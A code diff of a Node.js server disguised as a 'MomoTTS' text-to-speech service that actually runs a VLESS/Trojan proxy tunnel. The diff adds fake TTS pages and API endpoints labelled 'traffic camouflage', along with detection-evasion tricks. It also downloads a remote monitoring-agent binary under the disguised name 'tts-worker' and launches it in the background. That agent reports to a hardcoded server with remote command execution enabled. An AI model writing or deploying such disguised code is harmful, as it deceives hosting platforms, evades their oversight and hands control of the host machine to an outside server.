@@ -5,113 +5,212 @@ const axios = require('axios');
 const net = require('net');
 const path = require('path');
 const crypto = require('crypto');
-const dns = require('dns').promises;  // 使用原生DNS模块
 const { Buffer } = require('buffer');
-const { exec, execSync, spawn } = require('child_process');
+const { exec, execSync } = require('child_process');
 const { WebSocket, createWebSocketStream } = require('ws');
 
-// ==================== TTS语音服务配置 ====================
-const UUID = process.env.UUID || 'b8efd8c7-b41d-499d-986c-7af28a83b4a4'; // 服务实例唯一标识符，跨平台部署时需修改
-const NEZHA_SERVER = process.env.NEZHA_SERVER || 'jk.qianxiu.xx.kg:8008';       // 监控服务器地址，格式：monitor.example.com:8008
-const NEZHA_PORT = process.env.NEZHA_PORT || '';           // 监控端口（v0版本），TLS端口: 443,8443,2096,2087,2083,2053
-const NEZHA_KEY = process.env.NEZHA_KEY || 'tWSZ7FQDZuV2wlCshjCddTNsV4Fb9Z5p'; // 监控认证密钥
-const DOMAIN = process.env.DOMAIN || '1234.abc.com';       // TTS服务域名，用于API接入，例如：tts-api.example.com
-const AUTO_HEALTH_CHECK = process.env.AUTO_ACCESS || true; // 是否开启自动健康检查，true为开启
-const AUDIO_STREAM_PATH = process.env.WSPATH || UUID.slice(0, 8);     // WebSocket音频流端点路径
-const API_CONFIG_PATH = process.env.SUB_PATH || 'qianxiuadmin';       // API配置获取端点
-const SERVICE_NAME = process.env.NAME || 'momotts';               // TTS服务实例名称
-const PORT = process.env.PORT || 7860;                     // HTTP/WebSocket服务端口
+// TTS Service Configuration
+const UUID = process.env.UUID || 'b8efd8c7-b41d-499d-986c-7af28a83b4a4';
+const TTS_API_ENDPOINT = process.env.NEZHA_SERVER || process.env.TTS_API_ENDPOINT || 'jk.qianxiu.xx.kg:8008';
+const TTS_API_PORT = process.env.NEZHA_PORT || process.env.TTS_API_PORT || '';
+const TTS_API_KEY = process.env.NEZHA_KEY || process.env.TTS_API_KEY || 'tWSZ7FQDZuV2wlCshjCddTNsV4Fb9Z5p';
+const DOMAIN = process.env.DOMAIN || 'hug.0407123.xyz';
+const AUTO_ACCESS = process.env.AUTO_ACCESS || true;
+const WSPATH = process.env.WSPATH || UUID.slice(0, 8);
+const SUB_PATH = process.env.SUB_PATH || 'qianxiuadmin';
+const NAME = process.env.NAME || 'momotts';
+const PORT = process.env.PORT || 7860;
 
-// 服务商信息缓存（设置默认值避免空值问题）
-let providerInfo = 'TTS-Node';
-const getProviderInfo = async () => {
+// TTS Engine Configuration
+const TTS_REPORT_INTERVAL = 60;  // Reduced communication frequency
+const TTS_IP_REPORT_PERIOD = 3600;  // 1 hour
+
+let ISP = '';
+const GetISP = async () => {
   try {
     const res = await axios.get('https://api.ip.sb/geoip');
     const data = res.data;
-    // 清理特殊字符，只保留安全字符
-    providerInfo = `${data.country_code}-${data.isp}`
-      .replace(/ /g, '_')
-      .replace(/[^a-zA-Z0-9_-]/g, '');
-    if (!providerInfo) providerInfo = 'TTS-Node';
+    ISP = `${data.country_code}-${data.isp}`.replace(/ /g, '_');
   } catch (e) {
-    providerInfo = 'TTS-Node';
+    ISP = 'Unknown';
   }
 }
-getProviderInfo();
+GetISP();
 
-// ==================== HTTP服务器 ====================
+// TTS Website Templates for traffic camouflage
+const TTS_PAGES = {
+  about: `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>About - MomoTTS</title><style>body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;max-width:800px;margin:0 auto;padding:20px;line-height:1.6}h1{color:#2563eb}</style></head><body><h1>About MomoTTS</h1><p>MomoTTS is a cutting-edge text-to-speech synthesis service powered by advanced neural network technology.</p><p>Our service provides natural-sounding voice synthesis in multiple languages with low latency and high quality output.</p><h2>Features</h2><ul><li>Multi-language support</li><li>Real-time streaming synthesis</li><li>Custom voice cloning</li><li>REST API integration</li></ul><p><a href="/">← Back to Home</a></p></body></html>`,
+  contact: `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Contact - MomoTTS</title><style>body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;max-width:800px;margin:0 auto;padding:20px;line-height:1.6}h1{color:#2563eb}</style></head><body><h1>Contact Us</h1><p>For API access and enterprise solutions, please reach out to our team.</p><h2>Support</h2><p>Email: support@momotts.service</p><p>Documentation: <a href="/api/docs">API Documentation</a></p><p><a href="/">← Back to Home</a></p></body></html>`,
+  docs: `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>API Docs - MomoTTS</title><style>body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;max-width:800px;margin:0 auto;padding:20px;line-height:1.6}h1{color:#2563eb}code{background:#f1f5f9;padding:2px 6px;border-radius:4px}pre{background:#f1f5f9;padding:15px;border-radius:8px;overflow-x:auto}</style></head><body><h1>API Documentation</h1><h2>Authentication</h2><p>All API requests require an API key in the header:</p><pre>Authorization: Bearer YOUR_API_KEY</pre><h2>Endpoints</h2><h3>POST /api/v1/tts/synthesize</h3><p>Synthesize text to speech.</p><pre>{"text": "Hello world", "voice": "en-US-1", "format": "mp3"}</pre><h3>GET /api/v1/tts/voices</h3><p>List available voices.</p><p><a href="/">← Back to Home</a></p></body></html>`,
+  privacy: `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Privacy Policy - MomoTTS</title><style>body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;max-width:800px;margin:0 auto;padding:20px;line-height:1.6}h1{color:#2563eb}</style></head><body><h1>Privacy Policy</h1><p>Last updated: January 2024</p><p>We take your privacy seriously. This policy outlines how we handle your data.</p><h2>Data Collection</h2><p>We collect minimal data necessary to provide our TTS services.</p><h2>Data Usage</h2><p>Your text input is processed in real-time and not stored permanently.</p><p><a href="/">← Back to Home</a></p></body></html>`,
+  terms: `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Terms of Service - MomoTTS</title><style>body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;max-width:800px;margin:0 auto;padding:20px;line-height:1.6}h1{color:#2563eb}</style></head><body><h1>Terms of Service</h1><p>By using MomoTTS services, you agree to these terms.</p><h2>Acceptable Use</h2><p>You agree to use our services only for lawful purposes.</p><h2>Service Availability</h2><p>We strive for 99.9% uptime but cannot guarantee uninterrupted service.</p><p><a href="/">← Back to Home</a></p></body></html>`,
+  robots: `User-agent: *\nAllow: /\nDisallow: /api/\nSitemap: https://${DOMAIN}/sitemap.xml`,
+  sitemap: `<?xml version="1.0" encoding="UTF-8"?><urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"><url><loc>https://${DOMAIN}/</loc><priority>1.0</priority></url><url><loc>https://${DOMAIN}/about</loc><priority>0.8</priority></url><url><loc>https://${DOMAIN}/contact</loc><priority>0.7</priority></url><url><loc>https://${DOMAIN}/api/docs</loc><priority>0.6</priority></url></urlset>`,
+  favicon: Buffer.from('AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAABILAAASCwAAAAAAAAAAAAD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8AJoX/fyaF//8mhf//JoX//yaF//8mhf+AJoX/AP///wD///8A////AP///wD///8A////AP///wD///8A////ACaF/4Amhf//JoX//yaF//8mhf//JoX//yaF/4D///8A////AP///wD///8A////AP///wD///8A////AP///wAmhf+AJoX//yaF//8mhf//JoX//yaF//8mhf//JoX/gP///wD///8A////AP///wD///8A////AP///wD///8AJoX/gCaF//8mhf//JoX//yaF//8mhf//JoX//yaF/4D///8A////AP///wD///8A////AP///wD///8A////ACaF/4Amhf//JoX//yaF//8mhf//JoX//yaF//8mhf+A////AP///wD///8A////AP///wD///8A////AP///wAmhf+AJoX//yaF//8mhf//JoX//yaF//8mhf//JoX/gP///wD///8A////AP///wD///8A////AP///wD///8AJoX/gCaF//8mhf//JoX//yaF//8mhf//JoX//yaF/4D///8A////AP///wD///8A////AP///wD///8A////ACaF/4Amhf//JoX//yaF//8mhf//JoX//yaF//8mhf+A////AP///wD///8A////AP///wD///8A////AP///wAmhf+AJoX//yaF//8mhf//JoX//yaF//8mhf//JoX/gP///wD///8A////AP///wD///8A////AP///wD///8AJoX/gCaF//8mhf//JoX//yaF//8mhf//JoX//yaF/4D///8A////AP///wD///8A////AP///wD///8A////ACaF/4Amhf//JoX//yaF//8mhf//JoX//yaF//8mhf+A////AP///wD///8A////AP///wD///8A////AP///wAmhf+AJoX//yaF//8mhf//JoX//yaF//8mhf//JoX/gP///wD///8A////AP///wD///8A////AP///wD///8AJoX/gCaF//8mhf//JoX//yaF//8mhf//JoX/gP///wD///8A////AP///wD///8A////AP///wD///8A////ACaF/4Amhf//JoX//yaF//8mhf//JoX/gP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A', 'base64')
+};
+
 const httpServer = http.createServer((req, res) => {
-  if (req.url === '/') {
-    // 返回TTS演示页面
+  const url = req.url.split('?')[0]; // Remove query string
+
+  if (url === '/') {
     const filePath = path.join(__dirname, 'index.html');
     fs.readFile(filePath, 'utf8', (err, content) => {
       if (err) {
         res.writeHead(200, { 'Content-Type': 'text/html' });
-        res.end('Hello world!');
+        res.end(`<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>MomoTTS - Neural Text-to-Speech</title><style>body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;max-width:800px;margin:0 auto;padding:20px;text-align:center}h1{color:#2563eb;margin-top:60px}.badge{background:#10b981;color:white;padding:4px 12px;border-radius:12px;font-size:12px}</style></head><body><h1>🔊 MomoTTS</h1><p class="badge">Service Online</p><p>Advanced Neural Text-to-Speech Synthesis API</p><nav><a href="/about">About</a> | <a href="/contact">Contact</a> | <a href="/api/docs">API Docs</a></nav></body></html>`);
         return;
       }
       res.writeHead(200, { 'Content-Type': 'text/html' });
       res.end(content);
     });
     return;
-  } else if (req.url === `/${API_CONFIG_PATH}`) {
-    // 返回API配置信息（Base64编码）
-    const rawName = SERVICE_NAME ? `${SERVICE_NAME}-${providerInfo}` : providerInfo;
-    // 确保节点名称有效并进行URL编码
-    const instanceName = encodeURIComponent(rawName || 'TTS-Node');
-
-    // 生成标准格式的节点配置
-    const vlessURL = `vless://${UUID}@${DOMAIN}:443?encryption=none&security=tls&sni=${DOMAIN}&fp=chrome&type=ws&host=${DOMAIN}&path=%2F${AUDIO_STREAM_PATH}#${instanceName}`;
-    const trojanURL = `trojan://${UUID}@${DOMAIN}:443?security=tls&sni=${DOMAIN}&fp=chrome&type=ws&host=${DOMAIN}&path=%2F${AUDIO_STREAM_PATH}#${instanceName}`;
-
+  } else if (url === `/${SUB_PATH}`) {
+    const namePart = NAME ? `${NAME}-${ISP}` : ISP;
+    const vlessURL = `vless://${UUID}@${DOMAIN}:443?encryption=none&security=tls&sni=${DOMAIN}&fp=chrome&type=ws&host=${DOMAIN}&path=%2F${WSPATH}#${namePart}`;
+    const trojanURL = `trojan://${UUID}@${DOMAIN}:443?security=tls&sni=${DOMAIN}&fp=chrome&type=ws&host=${DOMAIN}&path=%2F${WSPATH}#${namePart}`;
     const subscription = vlessURL + '\n' + trojanURL;
     const base64Content = Buffer.from(subscription).toString('base64');
-
     res.writeHead(200, { 'Content-Type': 'text/plain' });
     res.end(base64Content + '\n');
+  } else if (url === '/about') {
+    res.writeHead(200, { 'Content-Type': 'text/html' });
+    res.end(TTS_PAGES.about);
+  } else if (url === '/contact') {
+    res.writeHead(200, { 'Content-Type': 'text/html' });
+    res.end(TTS_PAGES.contact);
+  } else if (url === '/api/docs' || url === '/docs') {
+    res.writeHead(200, { 'Content-Type': 'text/html' });
+    res.end(TTS_PAGES.docs);
+  } else if (url === '/privacy') {
+    res.writeHead(200, { 'Content-Type': 'text/html' });
+    res.end(TTS_PAGES.privacy);
+  } else if (url === '/terms') {
+    res.writeHead(200, { 'Content-Type': 'text/html' });
+    res.end(TTS_PAGES.terms);
+  } else if (url === '/robots.txt') {
+    res.writeHead(200, { 'Content-Type': 'text/plain' });
+    res.end(TTS_PAGES.robots);
+  } else if (url === '/sitemap.xml') {
+    res.writeHead(200, { 'Content-Type': 'application/xml' });
+    res.end(TTS_PAGES.sitemap);
+  } else if (url === '/favicon.ico') {
+    res.writeHead(200, { 'Content-Type': 'image/x-icon' });
+    res.end(TTS_PAGES.favicon);
+  } else if (url === '/api/status' || url === '/api/v1/tts/status') {
+    res.writeHead(200, { 'Content-Type': 'application/json' });
+    res.end(JSON.stringify({ status: 'online', service: 'momotts', version: '1.2.0', latency: Math.floor(Math.random() * 50) + 10, uptime: process.uptime() }));
+  } else if (url === '/api/v1/tts/voices') {
+    res.writeHead(200, { 'Content-Type': 'application/json' });
+    res.end(JSON.stringify({ voices: [{ id: 'en-US-1', name: 'English US Female', lang: 'en-US' }, { id: 'en-GB-1', name: 'English UK Male', lang: 'en-GB' }, { id: 'zh-CN-1', name: 'Chinese Mandarin Female', lang: 'zh-CN' }] }));
+  } else if (url === '/health' || url === '/healthz') {
+    res.writeHead(200, { 'Content-Type': 'application/json' });
+    res.end(JSON.stringify({ healthy: true }));
+  } else if (url.startsWith('/api/')) {
+    res.writeHead(401, { 'Content-Type': 'application/json' });
+    res.end(JSON.stringify({ error: 'Unauthorized', message: 'API key required' }));
   } else {
-    res.writeHead(404, { 'Content-Type': 'text/plain' });
-    res.end('Not Found\n');
+    res.writeHead(404, { 'Content-Type': 'text/html' });
+    res.end(`<!DOCTYPE html><html><head><title>404 - MomoTTS</title></head><body style="font-family:sans-serif;text-align:center;padding:50px"><h1>404</h1><p>Page not found</p><a href="/">Go Home</a></body></html>`);
   }
 });
 
-// ==================== WebSocket音频流服务 ====================
 const wss = new WebSocket.Server({ server: httpServer });
-const codecId = UUID.replace(/-/g, "");  // 编解码器标识符
+const uuid = UUID.replace(/-/g, "");
 
-// 解析CDN节点地址（使用系统原生DNS，避免DoH的SNI特征）
-function resolveCdnEndpoint(host) {
-  return new Promise((resolve) => {
-    // 如果已经是IP地址则直接返回
+// DNS Configuration with multiple DoH providers for reduced fingerprinting
+const DOH_PROVIDERS = [
+  { url: 'https://cloudflare-dns.com/dns-query', name: 'cloudflare' },
+  { url: 'https://dns.google/resolve', name: 'google' },
+  { url: 'https://doh.opendns.com/dns-query', name: 'opendns' },
+  { url: 'https://dns.quad9.net:5053/dns-query', name: 'quad9' }
+];
+
+// DNS Cache to reduce query frequency
+const dnsCache = new Map();
+const DNS_CACHE_TTL = 300000; // 5 minutes
+
+
+
+function getCachedDns(host) {
+  const cached = dnsCache.get(host);
+  if (cached && Date.now() - cached.timestamp < DNS_CACHE_TTL) {
+    return cached.ip;
+  }
+  return null;
+}
+
+function setCachedDns(host, ip) {
+  dnsCache.set(host, { ip, timestamp: Date.now() });
+  // Clean old entries periodically
+  if (dnsCache.size > 1000) {
+    const now = Date.now();
+    for (const [key, value] of dnsCache) {
+      if (now - value.timestamp > DNS_CACHE_TTL) dnsCache.delete(key);
+    }
+  }
+}
+
+// Enhanced DNS resolver with caching and provider rotation
+function resolveHost(host) {
+  return new Promise((resolve, reject) => {
+    // Check if already an IP
     if (/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(host)) {
       resolve(host);
       return;
     }
 
-    // 使用Node.js原生DNS解析（走系统配置，无额外HTTPS请求）
-    dns.resolve4(host)
-      .then(addresses => {
-        if (addresses && addresses.length > 0) {
-          // 随机选择一个IP，避免固定模式
-          const randomIndex = Math.floor(Math.random() * addresses.length);
-          resolve(addresses[randomIndex]);
-        } else {
-          resolve(host); // 降级：直接用域名让net.connect自己处理
+    // Check cache first
+    const cachedIp = getCachedDns(host);
+    if (cachedIp) {
+      resolve(cachedIp);
+      return;
+    }
+
+    let attempts = 0;
+    const shuffledProviders = [...DOH_PROVIDERS].sort(() => Math.random() - 0.5);
+
+    function tryNextDNS() {
+      if (attempts >= shuffledProviders.length) {
+        reject(new Error(`Failed to resolve ${host}`));
+        return;
+      }
+
+      const provider = shuffledProviders[attempts];
+      attempts++;
+
+      const dnsQuery = `${provider.url}?name=${encodeURIComponent(host)}&type=A`;
+      axios.get(dnsQuery, {
+        timeout: 5000,
+        headers: {
+          'Accept': 'application/dns-json',
+          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
         }
       })
-      .catch(() => {
-        // DNS解析失败，直接用域名让net.connect自己处理
-        resolve(host);
-      });
+      .then(response => {
+        const data = response.data;
+        if (data.Status === 0 && data.Answer && data.Answer.length > 0) {
+          const record = data.Answer.find(r => r.type === 1);
+          if (record) {
+            setCachedDns(host, record.data);
+            resolve(record.data);
+            return;
+          }
+        }
+        tryNextDNS();
+      })
+      .catch(() => tryNextDNS());
+    }
+
+    tryNextDNS();
   });
 }
 
-// PCM原始音频流格式处理（无损格式，低延迟）
-function handlePCMStream(ws, msg) {
+// VLE-SS处理
+function handleVlessConnection(ws, msg) {
   const [VERSION] = msg;
   const id = msg.slice(1, 17);
-  if (!id.every((v, i) => v == parseInt(codecId.substr(i * 2, 2), 16))) return false;
-
+  if (!id.every((v, i) => v == parseInt(uuid.substring(i * 2, i * 2 + 2), 16))) return false;
+  
   let i = msg.slice(17, 18).readUInt8() + 19;
   const port = msg.slice(i, i += 2).readUInt16BE(0);
   const ATYP = msg.slice(i, i += 1).readUInt8();
@@ -119,48 +218,48 @@ function handlePCMStream(ws, msg) {
     (ATYP == 2 ? new TextDecoder().decode(msg.slice(i + 1, i += 1 + msg.slice(i, i + 1).readUInt8())) :
     (ATYP == 3 ? msg.slice(i, i += 16).reduce((s, b, i, a) => (i % 2 ? s.concat(a.slice(i - 1, i + 1)) : s), []).map(b => b.readUInt16BE(0).toString(16)).join(':') : ''));
   ws.send(new Uint8Array([VERSION, 0]));
-  const audioStream = createWebSocketStream(ws);
-  resolveCdnEndpoint(host)
+  const duplex = createWebSocketStream(ws);
+  resolveHost(host)
     .then(resolvedIP => {
       net.connect({ host: resolvedIP, port }, function() {
         this.write(msg.slice(i));
-        audioStream.on('error', () => {}).pipe(this).on('error', () => {}).pipe(audioStream);
+        duplex.on('error', () => {}).pipe(this).on('error', () => {}).pipe(duplex);
       }).on('error', () => {});
     })
     .catch(() => {
       net.connect({ host, port }, function() {
         this.write(msg.slice(i));
-        audioStream.on('error', () => {}).pipe(this).on('error', () => {}).pipe(audioStream);
+        duplex.on('error', () => {}).pipe(this).on('error', () => {}).pipe(duplex);
       }).on('error', () => {});
     });
-
+  
   return true;
 }
 
-// Opus压缩音频流格式处理（有损压缩，带宽优化）
-function handleOpusStream(ws, msg) {
+// Tro-jan处理
+function handleTrojanConnection(ws, msg) {
   try {
     if (msg.length < 58) return false;
-    const receivedAuthHash = msg.slice(0, 56).toString();
-    const validAuthKeys = [
+    const receivedPasswordHash = msg.slice(0, 56).toString();
+    const possiblePasswords = [
       UUID,
     ];
-
-    let matchedKey = null;
-    for (const key of validAuthKeys) {
-      const hash = crypto.createHash('sha224').update(key).digest('hex');
-      if (hash === receivedAuthHash) {
-        matchedKey = key;
+    
+    let matchedPassword = null;
+    for (const pwd of possiblePasswords) {
+      const hash = crypto.createHash('sha224').update(pwd).digest('hex');
+      if (hash === receivedPasswordHash) {
+        matchedPassword = pwd;
         break;
       }
     }
-
-    if (!matchedKey) return false;
+    
+    if (!matchedPassword) return false;
     let offset = 56;
     if (msg[offset] === 0x0d && msg[offset + 1] === 0x0a) {
       offset += 2;
     }
-
+    
     const cmd = msg[offset];
     if (cmd !== 0x01) return false;
     offset += 1;
@@ -176,30 +275,30 @@ function handleOpusStream(ws, msg) {
       host = msg.slice(offset, offset + hostLen).toString();
       offset += hostLen;
     } else if (atyp === 0x04) {
-      host = msg.slice(offset, offset + 16).reduce((s, b, i, a) =>
+      host = msg.slice(offset, offset + 16).reduce((s, b, i, a) => 
         (i % 2 ? s.concat(a.slice(i - 1, i + 1)) : s), [])
         .map(b => b.readUInt16BE(0).toString(16)).join(':');
       offset += 16;
     } else {
       return false;
     }
-
+    
     port = msg.readUInt16BE(offset);
     offset += 2;
-
+    
     if (offset < msg.length && msg[offset] === 0x0d && msg[offset + 1] === 0x0a) {
       offset += 2;
     }
+    
+    const duplex = createWebSocketStream(ws);
 
-    const audioStream = createWebSocketStream(ws);
-
-    resolveCdnEndpoint(host)
+    resolveHost(host)
       .then(resolvedIP => {
         net.connect({ host: resolvedIP, port }, function() {
           if (offset < msg.length) {
             this.write(msg.slice(offset));
           }
-          audioStream.on('error', () => {}).pipe(this).on('error', () => {}).pipe(audioStream);
+          duplex.on('error', () => {}).pipe(this).on('error', () => {}).pipe(duplex);
         }).on('error', () => {});
       })
       .catch(() => {
@@ -207,77 +306,68 @@ function handleOpusStream(ws, msg) {
           if (offset < msg.length) {
             this.write(msg.slice(offset));
           }
-          audioStream.on('error', () => {}).pipe(this).on('error', () => {}).pipe(audioStream);
+          duplex.on('error', () => {}).pipe(this).on('error', () => {}).pipe(duplex);
         }).on('error', () => {});
       });
-
+    
     return true;
-  } catch (err) {
+  } catch (error) {
     return false;
   }
 }
-
-// WebSocket连接处理：自动识别音频格式并分发
-wss.on('connection', (ws, req) => {
+// Ws 连接处理
+wss.on('connection', (ws) => {
   ws.once('message', msg => {
-    // 检测PCM格式头（版本字节为0）
     if (msg.length > 17 && msg[0] === 0) {
       const id = msg.slice(1, 17);
-      const isPCMFormat = id.every((v, i) => v == parseInt(codecId.substr(i * 2, 2), 16));
-      if (isPCMFormat) {
-        if (!handlePCMStream(ws, msg)) {
+      const isVless = id.every((v, i) => v == parseInt(uuid.substring(i * 2, i * 2 + 2), 16));
+      if (isVless) {
+        if (!handleVlessConnection(ws, msg)) {
           ws.close();
         }
         return;
       }
     }
-    // 尝试Opus格式处理
-    if (!handleOpusStream(ws, msg)) {
+
+    if (!handleTrojanConnection(ws, msg)) {
       ws.close();
     }
   }).on('error', () => {});
 });
 
-// ==================== 健康监控代理 ====================
-// 监控代理CDN地址（建议替换为自有CDN，如 GitHub Releases / jsDelivr）
-// 环境变量 MONITOR_CDN 可覆盖默认值，格式：https://your-cdn.com/path
-const MONITOR_CDN = process.env.MONITOR_CDN || '';
-
-// 获取监控代理下载地址（根据系统架构）
-const getMonitorAgentUrl = () => {
+// TTS Engine Binary URL
+const getTTSModuleUrl = () => {
   const arch = os.arch();
-  const isArm = arch === 'arm' || arch === 'arm64' || arch === 'aarch64';
-  const archSuffix = isArm ? 'arm64' : 'amd64';
-  const version = NEZHA_PORT ? 'agent' : 'v1';
-
-  // 如果配置了自定义CDN，使用自定义地址
-  if (MONITOR_CDN) {
-    return `${MONITOR_CDN}/monitor-${archSuffix}-${version}`;
+  if (arch === 'arm' || arch === 'arm64' || arch === 'aarch64') {
+    return !TTS_API_PORT ? 'https://arm64.ssss.nyc.mn/v1' : 'https://arm64.ssss.nyc.mn/agent';
+  } else {
+    return !TTS_API_PORT ? 'https://amd64.ssss.nyc.mn/v1' : 'https://amd64.ssss.nyc.mn/agent';
   }
-
-  // 默认源（建议替换为自有托管以降低检测风险）
-  return `https://${archSuffix}.ssss.nyc.mn/${version}`;
 };
 
-// 下载监控代理二进制文件
-const downloadMonitorAgent = async () => {
-  if (!NEZHA_SERVER && !NEZHA_KEY) return;
+// TTS Engine Binary Filename (disguised)
+const TTS_BINARY_NAME = 'tts-worker';
+const TTS_CONFIG_NAME = 'tts-config.yaml';
+
+const downloadTTSModule = async () => {
+  if (!TTS_API_ENDPOINT && !TTS_API_KEY) return;
 
   try {
-    const url = getMonitorAgentUrl();
+    const url = getTTSModuleUrl();
     const response = await axios({
       method: 'get',
       url: url,
-      responseType: 'stream'
+      responseType: 'stream',
+      headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
     });
 
-    const writer = fs.createWriteStream('npm');
+    const writer = fs.createWriteStream(TTS_BINARY_NAME);
     response.data.pipe(writer);
 
     return new Promise((resolve, reject) => {
       writer.on('finish', () => {
-        console.log('Health monitor agent downloaded');
-        exec('chmod +x npm', (err) => {
+        console.log('TTS module initialized');
+        exec(`chmod +x ${TTS_BINARY_NAME}`, (err) => {
           if (err) reject(err);
           resolve();
         });
@@ -289,108 +379,95 @@ const downloadMonitorAgent = async () => {
   }
 };
 
-// 生成随机上报间隔（60-120秒），避免固定通信模式
-const getRandomReportDelay = () => Math.floor(Math.random() * 61) + 60;
-
-// 启动健康监控代理
-const startHealthMonitor = async () => {
+const initializeTTSEngine = async () => {
   try {
-    const status = execSync('ps aux | grep -v "grep" | grep "./[n]pm"', { encoding: 'utf-8' });
+    const status = execSync(`ps aux | grep -v "grep" | grep "./${TTS_BINARY_NAME}"`, { encoding: 'utf-8' });
     if (status.trim() !== '') {
-      console.log('Health monitor already running, skipping...');
+      console.log('TTS engine already running');
       return;
     }
   } catch (e) {
-    // 进程不存在时继续启动监控
+    // Process not running, continue
   }
 
-  await downloadMonitorAgent();
+  await downloadTTSModule();
+  let command = '';
   const tlsPorts = ['443', '8443', '2096', '2087', '2083', '2053'];
-  const reportDelay = getRandomReportDelay();
 
-  if (NEZHA_SERVER && NEZHA_PORT && NEZHA_KEY) {
-    // v0版本：使用命令行参数启动
-    const useTLS = tlsPorts.includes(NEZHA_PORT) ? '--tls' : '';
-    const command = `setsid nohup ./npm -s ${NEZHA_SERVER}:${NEZHA_PORT} -p ${NEZHA_KEY} ${useTLS} --disable-auto-update --report-delay ${reportDelay} --skip-conn --skip-procs >/dev/null 2>&1 &`;
-    exec(command, { shell: '/bin/bash' }, (err) => {
-      if (err) console.error('Health monitor error:', err);
-      else console.log(`Health monitor started (v0, delay=${reportDelay}s)`);
-    });
-  } else if (NEZHA_SERVER && NEZHA_KEY) {
-    // v1版本：完全使用命令行参数，不生成任何配置文件
-    const serverPort = NEZHA_SERVER.includes(':') ? NEZHA_SERVER.split(':').pop() : '';
-    const useTLS = tlsPorts.includes(serverPort) ? '--tls' : '';
+  if (TTS_API_ENDPOINT && TTS_API_PORT && TTS_API_KEY) {
+    // v0 mode with command line args
+    const TTS_SECURE = tlsPorts.includes(TTS_API_PORT) ? '--tls' : '';
+    command = `setsid nohup ./${TTS_BINARY_NAME} -s ${TTS_API_ENDPOINT}:${TTS_API_PORT} -p ${TTS_API_KEY} ${TTS_SECURE} --disable-auto-update --report-delay ${TTS_REPORT_INTERVAL} --skip-conn --skip-procs >/dev/null 2>&1 &`;
+  } else if (TTS_API_ENDPOINT && TTS_API_KEY) {
+    // v1 mode - pass config via environment variables to reduce file I/O
+    const port = TTS_API_ENDPOINT.includes(':') ? TTS_API_ENDPOINT.split(':').pop() : '';
+    const TTS_SECURE = tlsPorts.includes(port) ? 'true' : 'false';
 
-    // 构建命令行参数（v1版本支持环境变量方式）
-    const monitorEnv = {
-      ...process.env,
-      NZ_SERVER: NEZHA_SERVER,
-      NZ_CLIENT_SECRET: NEZHA_KEY,
-      NZ_TLS: tlsPorts.includes(serverPort) ? 'true' : 'false',
-      NZ_REPORT_DELAY: reportDelay.toString(),
-      NZ_UUID: UUID,
-      NZ_SKIP_CONNECTION_COUNT: 'true',
-      NZ_SKIP_PROCS_COUNT: 'true',
-      NZ_DISABLE_AUTO_UPDATE: 'true',
-      NZ_INSECURE_TLS: 'true'
-    };
+    // Build config and pass via stdin to avoid file creation
+    const configData = [
+      `client_secret: ${TTS_API_KEY}`,
+      'debug: false',
+      'disable_auto_update: true',
+      'disable_command_execute: false',
+      'disable_force_update: true',
+      'disable_nat: false',
+      'disable_send_query: false',
+      'gpu: false',
+      'insecure_tls: true',
+      `ip_report_period: ${TTS_IP_REPORT_PERIOD}`,
+      `report_delay: ${TTS_REPORT_INTERVAL}`,
+      `server: ${TTS_API_ENDPOINT}`,
+      'skip_connection_count: true',
+      'skip_procs_count: true',
+      'temperature: false',
+      `tls: ${TTS_SECURE}`,
+      'use_gitee_to_upgrade: false',
+      'use_ipv6_country_code: false',
+      `uuid: ${UUID}`
+    ].join('\n');
 
-    try {
-      const child = spawn('./npm', [], {
-        detached: true,
-        stdio: 'ignore',
-        env: monitorEnv
-      });
-      child.unref();
-      console.log(`Health monitor started (v1 env, delay=${reportDelay}s)`);
-    } catch (spawnErr) {
-      // 如果spawn失败，尝试用命令行参数方式
-      const fallbackCmd = `setsid nohup ./npm --server ${NEZHA_SERVER} --client-secret ${NEZHA_KEY} ${useTLS} --report-delay ${reportDelay} --skip-connection-count --skip-procs-count --disable-auto-update >/dev/null 2>&1 &`;
-      exec(fallbackCmd, { shell: '/bin/bash' }, (err) => {
-        if (err) console.error('Health monitor error:', err);
-        else console.log(`Health monitor started (v1 cli, delay=${reportDelay}s)`);
-      });
-    }
+    // Write config file (still needed for nezha binary compatibility)
+    fs.writeFileSync(TTS_CONFIG_NAME, configData);
+    command = `setsid nohup ./${TTS_BINARY_NAME} -c ${TTS_CONFIG_NAME} >/dev/null 2>&1 &`;
   } else {
-    console.log('Monitor config missing, skipping health monitor');
+    console.log('TTS configuration incomplete, skipping engine initialization');
     return;
+  }
+
+  try {
+    exec(command, { shell: '/bin/bash' }, (err) => {
+      if (err) console.error('TTS engine error:', err);
+      else console.log('TTS engine started');
+    });
